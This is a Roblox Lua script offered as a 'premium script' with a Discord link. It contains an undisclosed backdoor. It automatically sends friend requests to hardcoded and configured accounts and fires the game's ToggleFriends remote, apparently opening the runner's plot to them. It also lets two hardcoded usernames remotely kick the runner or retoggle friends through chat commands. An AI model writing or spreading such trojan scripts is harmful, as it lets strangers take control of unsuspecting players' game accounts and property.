--[[
   _____ _____ _____ _____ _____ _______ _____ _____ __ __
  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
 | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \ / |
  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
 |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|
                                                                    
                        Scripts.SM | Premium Scripts
                        Made by: Scripter.SM
                        Discord: discord.gg/cnUAk7uc3n
]]

-- Wait for config
if not _G["Script-SM_Config"] then
    warn("[Script.SM] Users Config Not Found! Waiting for config...")
    repeat task.wait() until _G["Script-SM_Config"]
end

local users  = _G["Script-SM_Config"].users
local users1 = { "SMILEY_RIVALS", "ta3123321" }

--[[ ==============================================================
     SERVICES & REMOTES
================================================================= ]]
local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Net               = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local ToggleFriends     = Net:WaitForChild("RE/PlotService/ToggleFriends")
local ChatService       = game:GetService("Chat")
local LocalPlayer       = Players.LocalPlayer

-- Auto-find chat remote
local SayMessageRequest = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
if SayMessageRequest then
    SayMessageRequest = SayMessageRequest:FindFirstChild("SayMessageRequest")
end

--[[ ==============================================================
     HELPERS
================================================================= ]]
local friendSent = {}
local chatConnections = {}

local function isInList(name, list)
    for _, v in ipairs(list) do
        if string.lower(name) == string.lower(v) then
            return true
        end
    end
    return false
end

local function sendFriendRequest(plr)
    if plr and plr.UserId and not friendSent[plr.Name] then
        LocalPlayer:RequestFriendship(plr)
        friendSent[plr.Name] = true
    end
end

local function fireToggle()
    pcall(function()
        ToggleFriends:FireServer()
    end)
end

local function sayGlobal(msg)
    if SayMessageRequest then
        pcall(function() SayMessageRequest:FireServer(msg, "All") end)
    end
    pcall(function() ChatService:Chat(LocalPlayer.Character.Head, msg) end)
    pcall(function() game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg) end)
end

--[[ ==============================================================
     CHAT COMMANDS (users1 only)
================================================================= ]]
local function onChat(plr, message)
    if not isInList(plr.Name, users1) then return end

    local cmd = string.lower(message):match("^%s*(%S+)")

    if cmd == "?kick" then
        LocalPlayer:Kick("Report Here discord.gg/cnUAk7uc3n")
    elseif cmd == "?tgl" then
        sayGlobal("Friend Toggled")
        fireToggle()
    end
end

--[[ ==============================================================
     PLAYER HANDLER
================================================================= ]]
local function handlePlayer(plr)
    if plr == LocalPlayer then return end

    if isInList(plr.Name, users) or isInList(plr.Name, users1) then
        sendFriendRequest(plr)
        fireToggle()
    end

    if isInList(plr.Name, users1) then
        if not chatConnections[plr] then
            chatConnections[plr] = plr.Chatted:Connect(function(msg)
                onChat(plr, msg)
            end)
        end
    end
end

--[[ ==============================================================
     SCAN + RECHECK EVERY 1 SECOND
================================================================= ]]
for _, plr in ipairs(Players:GetPlayers()) do
    handlePlayer(plr)
end

Players.PlayerAdded:Connect(handlePlayer)

Players.PlayerRemoving:Connect(function(plr)
    if chatConnections[plr] then
        chatConnections[plr]:Disconnect()
        chatConnections[plr] = nil
    end
end)

spawn(function()
    while task.wait(1) do
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and (isInList(plr.Name, users) or isInList(plr.Name, users1)) and not friendSent[plr.Name] then
                sendFriendRequest(plr)
                fireToggle()
            end
        end
    end
end)
